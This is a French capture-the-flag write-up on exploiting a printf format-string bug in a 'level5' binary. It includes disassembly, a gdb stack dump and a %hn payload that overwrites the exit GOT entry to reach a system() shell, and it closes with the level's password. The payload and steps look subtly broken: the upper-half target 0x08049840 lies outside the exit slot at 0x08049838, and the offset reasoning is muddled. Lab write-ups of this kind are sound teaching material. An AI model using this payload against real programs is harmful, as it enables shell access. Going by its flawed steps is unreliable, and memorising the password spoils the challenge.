format string + change ret address point to `o`

```
080484a4 <o>:
 80484a4:	55                   	push   ebp
 80484a5:	89 e5                	mov    ebp,esp
 80484a7:	83 ec 18             	sub    esp,0x18
 80484aa:	c7 04 24 f0 85 04 08 	mov    DWORD PTR [esp],0x80485f0
 80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>
 80484b6:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 80484bd:	e8 ce fe ff ff       	call   8048390 <_exit@plt>

080484c2 <n>:
 80484c2:	55                   	push   ebp
 80484c3:	89 e5                	mov    ebp,esp
 80484c5:	81 ec 18 02 00 00    	sub    esp,0x218
 80484cb:	a1 48 98 04 08       	mov    eax,ds:0x8049848
 80484d0:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80484d4:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200
 80484db:	00 
 80484dc:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484e2:	89 04 24             	mov    DWORD PTR [esp],eax
 80484e5:	e8 b6 fe ff ff       	call   80483a0 <fgets@plt>
 80484ea:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484f0:	89 04 24             	mov    DWORD PTR [esp],eax
 80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt>
 80484f8:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 80484ff:	e8 cc fe ff ff       	call   80483d0 <exit@plt>

08048504 <main>:
 8048504:	55                   	push   ebp
 8048505:	89 e5                	mov    ebp,esp
 8048507:	83 e4 f0             	and    esp,0xfffffff0
 804850a:	e8 b3 ff ff ff       	call   80484c2 <n>
 804850f:	c9                   	leave  
 8048510:	c3                   	ret    
```

Étapes :
1. Aller chercher l'adresse `80484f8` dans la stack
2. Écrire sur l'adresse `080484a4` (la fonction `o`) grâce à une format string.
3. Profiter du shell.

Une fois dans la fonction `printf`, voici l'état de la stack avec `AAAA` en input :
```
(gdb) x/90xw $sp
0xbffff504:	0xb7fff918	0x00000000	0x080484f8	0xbffff520
0xbffff514:	0x00000200	0xb7fd1ac0	0xb7ff37d0	0x41414141
```

On peut remarquer notre adresse en 3e élément, puis en 8e élément notre input. L'objectif est d'écrire avec %n sur le 3e.

`%x` affiche 0x200, soit la 5e adresse. Il faut donc trouver un moyen d'écrire en arrière. Impossible !

Oui, donc une autre technique s'offre à nous, changer l'adresse de la fonction `exit` dans la GOT (Global Offset Table), qui contient les adresses à resolve pour appeler les fonctions attendues.

Dans `objdump -R ./level5`, on peut y lire `08049838 R_386_JUMP_SLOT   exit`.
On connait donc l'adresse de la fonction exit dans la GOT.

Maintenant, écrivons notre exploit. Même délire que dans l'exercice précédent, on doit écrire dans :
- `08049838`
- `08049840`

l'adresse de `o`, donc `0x080484a4`.

On a donc :
- `\x38\x98\x04\x08` l'adresse qui va contenir les bits les plus faibles
- `\x40\x98\x04\x08` l'adresse qui va contenir les bits les plus forts
- `0x0804` = 2052, donc `0x07fc` (2044)
- `0x84a4` = 33956, donc `0x7ca0` (31904)

Il faudra donc commencer par écrire l'adresse à `0x40`, puis à `0x38`.

`\x40\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn`

Password: `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`